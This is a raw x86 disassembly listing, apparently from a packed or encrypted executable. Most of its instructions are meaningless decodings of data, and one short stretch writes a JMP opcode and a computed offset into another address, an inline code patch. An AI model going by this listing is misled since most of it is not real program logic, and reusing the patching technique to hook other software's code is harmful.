  41fb52:	fdiv   QWORD PTR [ecx]
  41fb54:	pop    edx
  41fb55:	mov    esi,0xbd231491
  41fb5a:	fsubr  st(5),st
  41fb5c:	daa    
  41fb5d:	xchg   esi,eax
  41fb5f:	(bad)  
  41fb60:	jl     0x41fbc6
  41fb62:	es pusha 
  41fb64:	inc    eax
  41fb65:	inc    ebp
  41fb66:	(bad)  
  41fb67:	pop    ebx
  41fb68:	outs   dx,DWORD PTR ds:[esi]
  41fb69:	out    0xc7,eax
  41fb6b:	adc    ebx,0xfdf5b51b
  41fb71:	sbb    bh,BYTE PTR [esp+ecx*4-0x46fc2e33]
  41fb78:	mov    dh,0x91
  41fb7a:	jmp    0x8be24fd5
  41fb7f:	jecxz  0x41fb2b
  41fb81:	mov    esi,0x77d7fb18
  41fb86:	xor    eax,DWORD PTR [esi+0x19]
  41fb89:	imul   edx,DWORD PTR [edi+0xa],0xffffff81
  41fb8d:	je     0x41fbba
  41fb8f:	data16 jae 0x41fb33
  41fb92:	mov    eax,0xbbdbccf8
  41fb97:	jge    0x41fbe3
  41fb99:	(bad)  
  41fb9a:	jne    0x41fbca
  41fb9c:	aaa    
  41fb9d:	(bad)  
  41fb9f:	test   eax,0xf2c13f59
  41fba4:	inc    DWORD PTR [ebx-0x42]
  41fba7:	mov    ecx,0x83d05b52
  41fbac:	sbb    BYTE PTR ds:0xb8140309,al
  41fbb2:	jg     0x41fb51
  41fbb4:	fild   WORD PTR [ebx+ebx*1-0x3d]
  41fbb8:	fsubp  st(0),st
  41fbba:	les    edx,FWORD PTR [ebx+0x48c61d22]
  41fbc0:	jge    0x41fb5e
  41fbc2:	cld    
  41fbc3:	push   ss
  41fbc4:	rol    DWORD PTR [edx+0x31],0xd2
  41fbc8:	fs inc edx
  41fbca:	jmp    0x1ae0:0xd993bb35
  41fbd1:	inc    edx
  41fbd2:	ror    bh,1
  41fbd4:	inc    ecx
  41fbd5:	inc    edi
  41fbd6:	xchg   edi,ecx
  41fbd8:	dec    ebp
  41fbd9:	cmp    DWORD PTR [edi+edi*1-0x21e0875c],ebx
  41fbe0:	sub    eax,0xf5248b7
  41fbe5:	clc    
  41fbe6:	inc    ecx
  41fbe7:	add    al,0x78
  41fbe9:	push   esi
  41fbea:	test   eax,0xb684b0d2
  41fbef:	(bad)  
  41fbf1:	pop    ecx
  41fbf2:	sbb    DWORD PTR ds:0x496f74d5,edx
  41fbf8:	xor    eax,0x5afd9544
  41fbfd:	push   bx
  41fbff:	cld    
  41fc00:	out    dx,eax
  41fc01:	and    bl,ah
  41fc03:	iret   
  41fc04:	mov    dl,0x9b
  41fc06:	sbb    BYTE PTR [esi],ch
  41fc08:	sbb    eax,0xb5adde47
  41fc0d:	mov    ah,0x21
  41fc0f:	fdivr  QWORD PTR [edx-0x510a4902]
  41fc15:	mov    ecx,0x57c3e3b9
  41fc1a:	je     0x41fc06
  41fc1c:	fmul   QWORD PTR [eax]
  41fc1e:	pop    es
  41fc1f:	mov    ds:0x19295395,al
  41fc24:	fild   QWORD PTR [ecx+0x1b6a38d6]
  41fc2a:	jnp    0x41fbda
  41fc2c:	shl    BYTE PTR [ebx],1
  41fc2e:	sbb    ecx,edi
  41fc30:	dec    esi
  41fc31:	repz jo 0x41fc9b
  41fc34:	lea    edi,[ecx]
  41fc36:	jmp    0x4810:0xdbead053
  41fc3d:	(bad)  
  41fc3f:	mov    edx,0xd9ccc83a
  41fc44:	mov    edx,0xd958c828
  41fc49:	sbb    ecx,esp
  41fc4b:	add    bh,BYTE PTR [ebx-0x63]
  41fc4e:	data16 fs mov cl,0x3d
  41fc52:	push   edi
  41fc53:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fc54:	sbb    ah,BYTE PTR [eax+0x217fd5c7]
  41fc5a:	pop    ss
  41fc5b:	jecxz  0x41fc44
  41fc5d:	push   esi
  41fc5e:	(bad)  
  41fc5f:	push   ds
  41fc60:	(bad)  
  41fc61:	lea    eax,[bx+0x4852]
  41fc66:	mov    ah,0xb6
  41fc68:	push   eax
  41fc69:	lea    edi,[edx+0x6583cab0]
  41fc6f:	sidtd  cs:0xcf25c930
  41fc77:	es loope 0x41fc80
  41fc7a:	cmp    al,BYTE PTR [edi+0x3c]
  41fc7d:	dec    ebp
  41fc7e:	inc    eax
  41fc7f:	outs   dx,DWORD PTR ds:[esi]
  41fc80:	xchg   edx,eax
  41fc81:	ret    
  41fc82:	daa    
  41fc83:	mov    ebx,0xc703c633
  41fc88:	push   eax
  41fc89:	mov    eax,DWORD PTR [ebp-0x24]
  41fc8c:	add    eax,0xaa
  41fc91:	push   eax
  41fc92:	mov    eax,DWORD PTR [ebp-0x24]
  41fc95:	mov    eax,DWORD PTR [eax+0x198]
  41fc9b:	push   DWORD PTR [eax]
  41fc9d:	call   0x423688
  41fca2:	mov    DWORD PTR [ebp-0x14],eax
  41fca5:	lea    eax,[ebp+0x4]
  41fca8:	mov    DWORD PTR [ebp-0x30],eax
  41fcab:	mov    eax,DWORD PTR [ebp-0x14]
  41fcae:	test   eax,eax
  41fcb0:	je     0x422078
  41fcb6:	lea    eax,[ebp-0x8]
  41fcb9:	mov    DWORD PTR [ebp-0x38],eax
  41fcbc:	mov    eax,DWORD PTR [ebp-0x34]
  41fcbf:	mov    DWORD PTR [ebp-0x8],eax
  41fcc2:	mov    eax,DWORD PTR [ebp-0x8]
  41fcc5:	mov    ecx,DWORD PTR [ebp-0x14]
  41fcc8:	sub    eax,ecx
  41fcca:	mov    DWORD PTR [ebp-0x8],eax
  41fccd:	mov    ecx,DWORD PTR [ebp-0x4]
  41fcd0:	xor    ecx,esi
  41fcd2:	mov    eax,0xffcd8d14
  41fcd7:	sub    eax,ecx
  41fcd9:	add    DWORD PTR [ebp-0x8],eax
  41fcdc:	mov    eax,DWORD PTR [ebp-0x8]
  41fcdf:	mov    ecx,DWORD PTR [ebp-0x14]
  41fce2:	mov    DWORD PTR [ecx+0x1],eax
  41fce5:	mov    eax,DWORD PTR [ebp-0x14]
  41fce8:	push   DWORD PTR [ebp-0x24]
  41fceb:	mov    BYTE PTR [eax],0xe9
  41fcee:	mov    eax,ds:0x42816b
  41fcf3:	push   DWORD PTR [eax]
  41fcf5:	push   DWORD PTR ds:0x4283c7
  41fcfb:	push   DWORD PTR ds:0x428173
  41fd01:	jmp    0x422061
  41fd06:	inc    edi
  41fd07:	cmp    esi,0x5e
  41fd0a:	mov    dh,0x3
  41fd0c:	(bad)  
  41fd0d:	jnp    0x41fce7
  41fd0f:	sub    DWORD PTR [esi],ebx
  41fd11:	jmp    0x41fd46
  41fd13:	xor    eax,0xa9ef9cea
  41fd18:	jge    0x41fd94
  41fd1a:	aas    
  41fd1b:	pop    edi
  41fd1c:	jp     0x41fd98
  41fd1e:	cmp    edx,ebp
  41fd20:	mov    cl,0xf6
  41fd22:	or     al,0xde
  41fd24:	fnstenv [ecx+0xd]
  41fd27:	mov    ah,0xd3
  41fd29:	btc    DWORD PTR [esi],eax
  41fd2c:	and    eax,0xd8059bd3
  41fd31:	lds    edx,FWORD PTR [esp+edx*2-0x23fda136]
  41fd38:	sbb    eax,0x10693233
  41fd3d:	mov    esi,DWORD PTR [edx+0x68]
  41fd40:	(bad)  
  41fd41:	fld    QWORD PTR [ebp+0x33ed3ac2]
  41fd47:	pushf  
  41fd48:	xchg   esp,eax
  41fd49:	pop    ecx
  41fd4a:	ins    DWORD PTR es:[edi],dx
  41fd4b:	stos   BYTE PTR es:[edi],al
  41fd4c:	sub    dl,BYTE PTR [eax-0x6ea8f99]
  41fd52:	pop    ss
  41fd53:	dec    ebx
  41fd54:	cli    
  41fd55:	fmul   QWORD PTR [edx+0x6b]
  41fd58:	bound  eax,QWORD PTR [esi]
  41fd5a:	mov    ds:0xa68d1cdd,al
  41fd5f:	and    eax,0xa676b5c3
  41fd64:	pop    ss
  41fd65:	ss pop ebp
  41fd67:	add    DWORD PTR [edx],edi
  41fd69:	fldcw  WORD PTR [edi+0x3]
  41fd6c:	lahf   
  41fd6d:	xor    dh,ch
  41fd6f:	push   0x8791fc93
  41fd74:	or     BYTE PTR [edx+0x1373c2a0],dl
  41fd7a:	sbb    DWORD PTR [ebp+0x40],esi
  41fd7d:	mov    BYTE PTR [esi-0x70],dl
  41fd80:	cmc    
  41fd81:	push   ebp
  41fd82:	mov    edx,0x44d2a0b2
  41fd87:	sbb    dh,BYTE PTR [edx]
  41fd89:	pop    esi
  41fd8a:	test   al,0x2c
  41fd8c:	cmp    eax,0x790ad317
  41fd91:	jg     0x41fd39
  41fd93:	mov    ?,WORD PTR [ecx-0x66]
  41fd96:	jp     0x41fd53
  41fd98:	ins    DWORD PTR es:[edi],dx
  41fd99:	jnp    0x41fdbe
  41fd9b:	lods   eax,DWORD PTR ds:[esi]
  41fd9c:	sbb    al,0x36
  41fd9e:	jne    0x41fdd2
  41fda0:	out    0xef,eax
  41fda2:	icebp  
  41fda3:	dec    esp
  41fda4:	mov    ebx,0xb6700e1c
  41fda9:	cmp    eax,0xa34bf776
  41fdae:	cmp    eax,0xdf13347b
  41fdb3:	jo     0x41fd9b
  41fdb5:	jecxz  0x41fe27
  41fdb7:	adc    dh,BYTE PTR [eax]
  41fdb9:	xchg   ebx,eax
  41fdba:	push   eax
  41fdbb:	faddp  st(3),st
  41fdbd:	int    0x3
  41fdbf:	mov    eax,ds:0x71a53629
  41fdc4:	test   edx,0x92e009cf
  41fdca:	in     al,dx
  41fdcb:	xchg   ebx,eax
  41fdcc:	push   edx
  41fdcd:	or     BYTE PTR [esi+0x37b6fb7a],al
  41fdd3:	and    bl,BYTE PTR [ebp+0x23ea7b11]
  41fdd9:	pop    eax
  41fdda:	int3   
  41fddb:	stos   DWORD PTR es:[edi],eax
  41fddc:	cmp    ah,bl
  41fdde:	leave  
  41fddf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fde0:	fstp   DWORD PTR [ecx+0x2a]
  41fde3:	jg     0x41fe23
  41fde5:	xor    BYTE PTR [eax],al
  41fde7:	sbb    edi,DWORD PTR [ecx]
  41fde9:	or     al,0xa9
  41fdeb:	mov    BYTE PTR [edi],0xb0
  41fdee:	stos   DWORD PTR es:[edi],eax
  41fdef:	mov    DWORD PTR [esi+eax*2+0x45a2362f],ecx
  41fdf6:	ja     0x41fe11
  41fdf8:	sbb    cl,BYTE PTR [edi-0x68]
  41fdfb:	cmp    eax,0xcfa1b61f
  41fe00:	out    dx,al
  41fe01:	fldenv [ebp+0x49]
  41fe04:	sub    ah,BYTE PTR fs:[ebx+0x4cc78c2e]
  41fe0b:	jl     0x41fe2f
  41fe0d:	or     DWORD PTR [edi-0x67],ebp
  41fe10:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fe12:	cmp    BYTE PTR [ebx+0x48c2e9c5],dh
  41fe18:	scas   al,BYTE PTR es:[edi]
  41fe19:	in     al,0x33
  41fe1b:	in     eax,dx
  41fe1c:	xchg   ebp,eax
  41fe1d:	adc    BYTE PTR [eax-0x7c02441e],bl
  41fe23:	outs   dx,BYTE PTR ds:[esi]
  41fe24:	call   0xf894:0x33e1dbb6
  41fe2b:	mov    dl,0xe7
  41fe2d:	jnp    0x41fdd5
  41fe2f:	enter  0x37f6,0x2f
  41fe33:	jnp    0x41fea0
  41fe35:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fe36:	pusha  
  41fe37:	popa   
  41fe38:	fldcw  WORD PTR [ebp-0x40]
  41fe3b:	call   0x1eb2:0x3b45a12d
  41fe42:	or     eax,0x35ca4dd0
  41fe47:	sub    esp,DWORD PTR [edx+0x6f0ca881]
  41fe4d:	addr16 pop ebx
  41fe4f:	nop
  41fe50:	retf   0x4214
  41fe53:	lea    ebp,[ecx+eax*1+0x41fc61a8]
  41fe5a:	rol    BYTE PTR ds:0xbf714f4d,cl
  41fe60:	lods   eax,DWORD PTR ds:[esi]
  41fe61:	dec    edx
  41fe62:	jns    0x41fe18
  41fe64:	in     al,dx
  41fe65:	mov    dh,0x71
  41fe67:	lea    ebx,[edi+0x78e74660]
  41fe6d:	mov    ch,0x1
  41fe6f:	xchg   edi,eax
  41fe70:	jecxz  0x41fec6
  41fe72:	or     DWORD PTR [ecx],0x24ab1186
  41fe78:	in     eax,dx
  41fe79:	dec    eax
  41fe7a:	push   ss
  41fe7b:	mov    eax,0xaaf290d8
  41fe80:	int3   
  41fe81:	(bad)  
  41fe82:	ins    BYTE PTR es:[edi],dx
  41fe83:	push   0xee3dd234
  41fe88:	mov    ch,0x49
  41fe8a:	int3   
  41fe8b:	mov    eax,ds:0xd7a3e9d5
  41fe90:	inc    ebp
  41fe91:	jl     0x41fe9a
  41fe93:	cwde   
  41fe94:	adc    eax,0x84cb8ba6
  41fe99:	mov    WORD PTR [ecx+eiz*1],?
  41fe9c:	push   0xe98b0aea
  41fea1:	ds call 0xd73c9270
  41fea7:	mov    dh,0x19
  41fea9:	dec    edx
  41feaa:	ror    BYTE PTR [ebp+0x23],1
  41fead:	shr    BYTE PTR [esi-0x63e82836],1
  41feb3:	iret   
  41feb4:	xchg   esp,eax
  41feb5:	or     DWORD PTR [ebp+0x79],esp
  41feb8:	mov    ebp,0xddbc36d9
  41febd:	jno    0x41fed2
  41febf:	fsubr  st(6),st
  41fec1:	ja     0x41fe71
  41fec3:	arpl   WORD PTR ds:0xcbb6c2cc,bp
  41fec9:	popf   
  41feca:	stc    
  41fecb:	fidivr DWORD PTR [ebx-0x3a]
  41fece:	adc    eax,0xdb615ff1
  41fed3:	clc    
  41fed4:	pop    esp
  41fed5:	mov    bl,0x37
  41fed7:	shr    bh,cl
  41fed9:	dec    ebx
  41feda:	das    
  41fedb:	stos   BYTE PTR es:[edi],al
  41fedc:	jmp    0x41fe71
  41fede:	scas   al,BYTE PTR es:[edi]
  41fedf:	int3   
  41fee0:	imul   edx,DWORD PTR [ebx],0xffffffb2
  41fee3:	xor    DWORD PTR [ebx+0x69104406],eax
  41fee9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41feea:	ss inc esp
  41feec:	jne    0x41fecd
  41feee:	scas   al,BYTE PTR es:[edi]
  41feef:	out    dx,al
  41fef0:	stc    
  41fef1:	(bad)  
  41fef2:	pop    ds
  41fef3:	fsubr  st,st(0)
  41fef5:	call   DWORD PTR [edi-0x58e1a6f1]
  41fefb:	adc    ch,0xf5
  41fefe:	mul    BYTE PTR [edi+0x73]
  41ff01:	dec    esi
  41ff02:	push   es
  41ff03:	mov    al,BYTE PTR [ecx-0xb068aee]
  41ff09:	(bad)  
  41ff0a:	mov    bl,0x37
  41ff0c:	imul   ebp,DWORD PTR [esi+0x25],0xffffffbf
  41ff10:	pop    esi
  41ff11:	sub    DWORD PTR [eax-0x545c9da3],ecx
  41ff17:	dec    ebx
  41ff18:	dec    ebp
  41ff19:	ja     0x41fec2
  41ff1b:	inc    ebx
  41ff1c:	sub    ebp,esp
  41ff1e:	mov    bh,0x1d
  41ff20:	jb     0x41fefa
  41ff22:	fwait
  41ff23:	mov    WORD PTR [edx-0x6c653ffd],?
  41ff29:	mov    eax,0x45570bb0
  41ff2e:	mov    ss,ebp
  41ff30:	xlat   BYTE PTR ds:[ebx]
  41ff31:	cmc    
  41ff32:	dec    ebp
  41ff33:	cwde   
  41ff34:	add    esi,DWORD PTR [ebp-0x2422451c]
  41ff3a:	push   0xffffffb3
  41ff3c:	fidivr DWORD PTR [edi+0x5b]
  41ff3f:	cmp    ecx,DWORD PTR [ebx+0x4a436b04]
  41ff45:	mov    edx,0xaa497b79
  41ff4a:	sahf   
  41ff4b:	mov    ds:0xd3e1e723,eax
  41ff50:	loop   0x41ffa8
  41ff52:	jnp    0x41ff96
  41ff54:	fsubr  QWORD PTR [ebx]
  41ff56:	pop    ds
  41ff57:	retf   
  41ff58:	pop    edx
  41ff59:	data16 sti 
  41ff5b:	ret    0xdc3e
  41ff5e:	mov    ds:0x9da7adb2,eax
  41ff63:	inc    ebp
  41ff64:	in     al,0xfa
  41ff66:	pop    ds
  41ff67:	ret    
  41ff68:	in     eax,dx
  41ff69:	or     cl,BYTE PTR [edi]
  41ff6b:	sub    dl,bh
  41ff6d:	pusha  
  41ff6e:	pop    esi
  41ff6f:	xor    BYTE PTR [ebx-0x6f],0x1c
  41ff73:	retf   
  41ff74:	pop    ss
  41ff75:	outs   dx,BYTE PTR ds:[esi]
  41ff76:	sahf   
  41ff77:	xchg   edx,eax
  41ff78:	lods   eax,DWORD PTR ds:[esi]
  41ff79:	fldcw  WORD PTR [edi+0xe]
  41ff7c:	sub    BYTE PTR [ebx],ah
  41ff7e:	aam    0x5a
  41ff80:	pop    ss
  41ff81:	push   ecx
  41ff82:	adc    eax,0x90c8a9f1
  41ff87:	enter  0xf7e0,0x23
  41ff8b:	ins    BYTE PTR es:[edi],dx
  41ff8c:	jge    0x41ffdb
  41ff8e:	mov    esp,DWORD PTR [eax+0x78]
  41ff91:	rol    BYTE PTR [ebx+0x197707df],1
  41ff97:	das    
  41ff98:	mov    edi,0x67498d3e
  41ff9d:	mov    cl,0x6e
  41ff9f:	ss inc ecx
  41ffa1:	fs mov bl,0x1c
  41ffa4:	cmp    eax,0x686598a0
  41ffa9:	push   ecx
  41ffaa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ffac:	sub    eax,0x6182c45b
  41ffb1:	retf   
  41ffb2:	fmul   QWORD PTR [edi+0x5f63b18c]
  41ffb8:	add    DWORD PTR [esi+ebp*4],esp
  41ffbb:	pop    ebp
  41ffbc:	push   ebx
  41ffbd:	mov    edi,0x8b79b086
  41ffc2:	sub    ah,dh
  41ffc4:	mov    cl,cl
  41ffc6:	imul   esp,DWORD PTR [esi-0x2353fe08],0xffffffab
  41ffcd:	adc    eax,0x771a655d
  41ffd2:	test   al,0x22
  41ffd4:	lock inc edx
  41ffd6:	pop    ebx
  41ffd7:	lds    eax,FWORD PTR [ebx-0x56]
  41ffda:	or     DWORD PTR ds:0xb36fdd78,edx
  41ffe0:	jle    0x41ffca
  41ffe2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ffe3:	xchg   ebp,eax
  41ffe4:	push   edi
  41ffe5:	xchg   esp,eax
  41ffe6:	dec    ecx
  41ffe7:	mov    bl,0xf0
  41ffe9:	xor    edx,DWORD PTR [ebx+ebx*8+0x30b10e1d]
  41fff0:	fidiv  WORD PTR [edx+eiz*1-0x28]
  41fff4:	dec    eax
  41fff5:	push   ebx
  41fff6:	popa   
  41fff7:	or     BYTE PTR [ebp-0x6b],al
  41fffa:	scas   eax,DWORD PTR es:[edi]
  41fffb:	push   es
  41fffc:	cmp    BYTE PTR [ebx-0x5f],ch
  41ffff:	or     DWORD PTR [edi],esp
  420001:	fs mov dl,0x91
  420004:	leave  
  420005:	ins    BYTE PTR es:[edi],dx
  420006:	imul   edx,DWORD PTR [ebx],0x1a8fd691
  42000c:	mov    cl,0x1e
  42000e:	mov    bh,dh
  420010:	pop    es
  420011:	push   ebp
  420012:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420013:	and    ch,BYTE PTR [esi]
  420015:	stc    
  420016:	adc    esp,DWORD PTR [edx]
  420018:	xor    dh,al
  42001a:	xlat   BYTE PTR ds:[ebx]
  42001b:	adc    ch,BYTE PTR [eax]
  42001d:	dec    eax
  42001e:	rol    BYTE PTR [edi+eax*8+0x1],cl
  420022:	push   ebx
  420023:	pop    ss
  420024:	fst    QWORD PTR [edx-0x8840bbe]
  42002a:	retf   0xd9ad
  42002d:	dec    ebx
  42002e:	ss je  0x420031
  420031:	sbb    eax,0x189536e4
  420036:	cmp    eax,0xb069c3a
  42003b:	into   
  42003c:	add    al,0xa6
  42003e:	jmp    0xd84e84d
  420043:	in     al,dx
  420044:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420045:	aas    
  420046:	or     BYTE PTR [ecx-0x363c004f],bh
  42004c:	jbe    0x42004e
  42004e:	cli    
  42004f:	(bad)  
  420050:	popf   
  420051:	push   ecx
  420052:	push   ebp
  420053:	or     eax,0x20404461
  420058:	or     al,0x42
  42005a:	sbb    DWORD PTR [edi-0x42f7f30f],edx
  420060:	jmp    0xfad5a5bf
  420065:	psubsw mm3,QWORD PTR [eax-0x331223a5]
  42006c:	xor    eax,0x7da49187
  420071:	add    ecx,edi
  420073:	call   0x904f:0xb7cba25d
  42007a:	adc    ch,cl
  42007c:	pusha  
  42007d:	add    eax,0x25b947b1
  420082:	xchg   BYTE PTR [ecx+0x27],ch
  420085:	jmp    0x42007a
  420087:	jecxz  0x420085
  420089:	clc    
  42008a:	adc    ecx,ebx
  42008c:	outs   dx,DWORD PTR ds:[esi]
  42008d:	and    dl,BYTE PTR [edx]
  42008f:	sub    bl,BYTE PTR [edx]
  420091:	rdpru  
  420094:	inc    ecx
  420095:	cmc    
  420096:	add    DWORD PTR [ebx+0x19bc3543],esp
  42009c:	xlat   BYTE PTR ds:[ebx]
  42009d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42009e:	popa   
  42009f:	push   ss
  4200a0:	shl    DWORD PTR [edi-0x24],0xef
  4200a4:	in     eax,0xd9
  4200a6:	sti    
  4200a7:	lods   al,BYTE PTR ds:[esi]
  4200a8:	lods   al,BYTE PTR ds:[esi]
  4200a9:	pop    edi
  4200aa:	mov    ecx,0x44b3afb0
  4200af:	sbb    DWORD PTR [ecx-0x38b829c],0xd23ac6cf
  4200b9:	xchg   esi,eax
  4200ba:	pushf  
  4200bb:	fadd   st,st(1)
  4200bd:	xchg   ecx,eax
  4200be:	xchg   edi,eax
  4200bf:	mov    ch,0x38
  4200c1:	leave  
  4200c2:	add    ch,BYTE PTR [esi]
  4200c4:	xchg   ebx,eax
  4200c5:	jg     0x4200f5
  4200c7:	vpslld xmm6,xmm2,0x78
  4200cc:	or     eax,0xd78c191c
  4200d1:	dec    ebp
  4200d2:	inc    edi
  4200d3:	mov    DWORD PTR [eax],ecx
  4200d5:	das    
  4200d6:	imul   eax,DWORD PTR [ebx+0x58],0xffffffbb
  4200da:	jnp    0x420080
  4200dc:	jg     0x420078
  4200de:	mov    edx,0xa3edd1cd
  4200e3:	bound  edx,QWORD PTR [ebp-0x5761f10]
  4200e9:	outs   dx,DWORD PTR ds:[esi]
  4200ea:	cld    
  4200eb:	and    bh,bh
  4200ed:	pop    esp
  4200ee:	test   DWORD PTR [ebp+0x62],esp
  4200f1:	rcr    ah,0xb8
  4200f4:	js     0x4200ed
  4200f6:	test   eax,0xe602055e
  4200fb:	jae    0x42010b
  4200fd:	push   edi
  4200fe:	pop    ecx
  4200ff:	xchg   esp,eax
  420100:	cmp    edx,DWORD PTR [ebp-0x203671bd]
  420106:	(bad)  
  420107:	jae    0x42011c
  420109:	call   0x3e92dfd1
  42010e:	add    BYTE PTR [eax+ecx*8+0x69],0x1e
  420113:	jmp    0x4cf00098
  420118:	jns    0x420120
  42011a:	sub    dl,BYTE PTR [ecx+0x76b786c0]
  420120:	mov    esp,0xc223e8bf
  420125:	aam    0xbf
  420127:	fdivr  QWORD PTR ds:0x81c52d22
  42012d:	cmp    bl,dl
  42012f:	pop    ebp
  420130:	inc    esp
  420131:	outs   dx,DWORD PTR ds:[esi]
  420132:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420133:	jae    0x4200bf
  420135:	mov    DWORD PTR [ebp+0x48],edi
  420138:	and    edi,DWORD PTR [eax+eiz*1+0x14]
  42013c:	out    0x6d,al
  42013e:	test   al,0xae
  420140:	(bad)  
  420141:	fisttp WORD PTR [ecx+0x6d]
  420144:	lea    esi,[ecx-0x4d]
  420147:	idiv   BYTE PTR [eax+0x39]
  42014a:	scas   al,BYTE PTR es:[edi]
  42014b:	cmp    edx,DWORD PTR [esi-0x9]
  42014e:	sub    BYTE PTR [eax+0xe],bl
  420151:	test   DWORD PTR [eax-0x401d882c],ecx
  420157:	test   DWORD PTR [ebp+ebx*2-0x3cfdc054],esi
  42015e:	rcl    BYTE PTR [ebp-0x54],cl
  420161:	jmp    0xaf4fc3b0
  420166:	aam    0x7d
  420168:	sysret 
  42016a:	mov    eax,ds:0xbb083deb
  42016f:	mov    ebx,0x7aa3962b
  420174:	push   ecx
  420175:	xor    cl,BYTE PTR [ebx-0x76]
  420178:	lds    edi,FWORD PTR [ebp-0x9e3f76b]
  42017e:	sub    eax,0x16b040ad
  420183:	mov    ah,0x40
  420185:	push   eax
  420186:	jp     0x4201d1
  420188:	fidivr WORD PTR [eax+0x23]
  42018b:	pop    ebx
  42018c:	xchg   DWORD PTR [eax+0x15],edi
  42018f:	dec    edx
  420190:	jno    0x4201c9
  420192:	sbb    eax,0x84f45b55
  420197:	or     eax,0xaf2ab32
  42019c:	mov    dh,0x18
  42019e:	fwait
  42019f:	sub    bh,dh
  4201a1:	repz cmp BYTE PTR [ecx+0x61e3bf5],0x84
  4201a9:	(bad)  [ecx+0x1c03835]
  4201af:	or     BYTE PTR [eax+0x2ff9f4b0],0x23
  4201b6:	js     0x420231
  4201b8:	push   edx
  4201b9:	add    DWORD PTR [eax+eiz*8-0x31],esi
  4201bd:	inc    ebx
  4201be:	push   esi
  4201bf:	mov    esp,0xf6b2032
  4201c4:	out    0xc5,al
  4201c6:	out    0x5,al
  4201c8:	out    dx,al
  4201c9:	sbb    eax,0x83c7b6fb
  4201ce:	fwait
  4201cf:	jl     0x420161
  4201d1:	jb     0x4201a9
  4201d3:	out    dx,al
  4201d4:	mov    eax,0xe3fc2dee
  4201d9:	push   ds
  4201da:	lods   eax,DWORD PTR gs:[esi]
  4201dc:	and    edi,esp
  4201de:	lods   al,BYTE PTR ds:[esi]
  4201df:	push   cs
  4201e0:	iret   
  4201e1:	jmp    0x17f279a3
  4201e6:	xor    al,0xe9
  4201e8:	lods   eax,DWORD PTR ds:[esi]
  4201e9:	inc    ebx
  4201ea:	inc    esi
  4201eb:	xchg   ebp,eax
  4201ec:	leave  
  4201ed:	sar    BYTE PTR [eax],cl
  4201ef:	arpl   WORD PTR [esi+0x71f7c610],dx
  4201f5:	js     0x4201d4
  4201f7:	stos   DWORD PTR es:[edi],eax
  4201f8:	pop    ds
  4201f9:	int3   
  4201fa:	in     eax,0xe9
  4201fc:	out    dx,al
  4201fd:	test   al,0xab
  4201ff:	and    DWORD PTR [edx-0x20],ebp
  420202:	push   eax
  420203:	inc    ecx
  420204:	sbb    DWORD PTR gs:[edx],edi
  420207:	cli    
  420208:	dec    eax
  420209:	jmp    0x4201bf
  42020b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42020c:	pop    ebp
  42020d:	mov    dl,0xa2
  42020f:	retf   0xd753
  420212:	cmp    edi,DWORD PTR [esi]
  420214:	test   al,0xa2
  420216:	std    
  420217:	inc    ebx
  420218:	int    0xfe
  42021a:	pop    WORD PTR ds:0x390f9e63
  420221:	jl     0x420224
  420223:	sahf   
  420224:	mov    esi,0xcf68ea0e
  420229:	ins    DWORD PTR es:[edi],dx
  42022a:	cmp    eax,0x83557543
  42022f:	dec    esp
  420230:	enter  0x425d,0xea
  420234:	in     eax,dx
  420235:	mov    BYTE PTR ds:0x970843f,ah
  42023b:	out    0x4b,eax
  42023d:	icebp  
  42023e:	mov    eax,DWORD PTR [esi-0x23]
  420241:	xor    eax,0x4d9430e6
  420246:	and    ah,bh
  420248:	jg     0x42028d
  42024a:	jo     0x4201e8
  42024c:	xor    eax,0xb5414fb
  420251:	mov    ebx,0x6bb25107
  420256:	jno    0x420268
  420258:	jl     0x4202a2
  42025a:	call   0x8cc8492d
  42025f:	ficom  WORD PTR [esi+eax*2+0x2e]
  420263:	iret   
  420264:	cmovns esi,DWORD PTR [edi+0x67b8628b]
  42026b:	xchg   DWORD PTR [ebp-0x1b],eax
  42026e:	aas    
  42026f:	scas   eax,DWORD PTR es:[edi]
  420270:	sbb    ebp,DWORD PTR [edx+0x599274f7]
  420276:	and    ecx,DWORD PTR [ebp+ebx*2+0x3b26fd37]
  42027d:	shl    BYTE PTR [edx],0xba
  420280:	jno    0x4202d4
  420282:	add    bh,BYTE PTR [ecx-0x2e]
  420285:	ss jmp 0x4202e4
  420288:	lahf   
  420289:	fisub  DWORD PTR [esp+edx*8-0x1f70b7b1]
  420290:	mov    ds:0xa90135d0,al
  420295:	ins    DWORD PTR es:[edi],dx
  420296:	clc    
  420297:	fisttp WORD PTR [eax+0x28]
  42029a:	daa    
  42029b:	inc    edi
  42029c:	mov    ah,0xba
  42029e:	cmp    bh,ch
  4202a0:	repnz idiv DWORD PTR [eax+0x5a]
  4202a4:	shr    esi,0x4c
  4202a7:	dec    esi
  4202a8:	sar    BYTE PTR [ebx],1
  4202aa:	xlat   BYTE PTR ds:[ebx]
  4202ab:	(bad)  
  4202ac:	loopne 0x42025c
  4202ae:	or     eax,0x7266c303
  4202b3:	call   0x9ca241fa
  4202b8:	lock mov ds:0x993f4d85,al
  4202be:	jg     0x420306
  4202c0:	xchg   ebp,eax
  4202c1:	mov    ch,0x91
  4202c3:	stc    
  4202c4:	int    0xf4
  4202c6:	sahf   
  4202c7:	mov    cl,0x3a
  4202c9:	daa    
  4202ca:	or     bl,BYTE PTR [ebp+0x72]
  4202cd:	mov    ebp,DWORD PTR [ecx+0x1cbcfa04]
  4202d3:	sti    
  4202d4:	push   0x69
  4202d6:	push   ss
  4202d7:	mov    dl,0x7f
  4202d9:	pop    es
  4202da:	outs   dx,BYTE PTR ds:[esi]
  4202db:	jno    0x420277
  4202dd:	or     esi,DWORD PTR [edx+0x76]
  4202e0:	mov    WORD PTR [ebp-0x24],?
  4202e3:	sbb    BYTE PTR [ecx],ch
  4202e5:	inc    eax
  4202e6:	pop    esi
  4202e7:	sbb    al,0x15
